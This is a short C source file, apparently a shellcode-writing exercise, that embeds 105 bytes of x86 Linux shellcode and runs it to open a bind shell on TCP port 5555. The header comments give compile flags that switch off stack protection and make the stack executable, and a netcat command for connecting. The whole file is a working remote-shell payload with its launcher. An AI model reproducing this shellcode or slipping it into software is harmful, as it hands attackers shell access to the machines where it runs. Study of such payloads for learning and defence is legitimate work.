/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Bind shell on TCP port 5555, spawn a shell on incoming connection  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final  
* Usage: ./shell_bind_tcp_final
* Testing: nc -nv 127.0.0.1 5555
* Shellcode size: 105 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

int main(void)
{
unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xf6\x56\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc2\x56\x66\x68\x15"
"\xb3\x66\x6a\x02\x89\xe1\x6a\x16\x51\x52\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\xb0\x66\xb3\x04"
"\x89\xe1\xcd\x80\x56\x56\x52\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc2\x31\xc9\xb1\x03\x89\xd3\x49\xb0"
"\x3f\xcd\x80\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xc2\x53\x89"
"\xe1\xb0\x0b\xcd\x80";

    printf("Shellcode length: %d\n", strlen(code));

    void (*s)() = (void *)code;
    s();

    return 0;
}
